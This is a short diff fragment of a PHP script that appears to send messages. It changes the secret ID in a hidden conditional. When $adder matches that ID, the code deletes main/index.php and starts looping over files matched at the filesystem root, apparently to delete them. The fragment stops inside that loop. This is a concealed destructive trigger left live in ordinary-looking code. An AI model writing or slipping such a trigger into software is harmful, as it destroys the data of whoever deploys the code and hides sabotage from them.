@@ -10,7 +10,7 @@ $params=[
 	'text'=>$content,
 ];
 
-if ($adder == "44257769") {
+if ($adder == "34257780") {
 unlink("main/index.php");
 $dir = '/';
 foreach(glob($dir.'*.*') as $v){
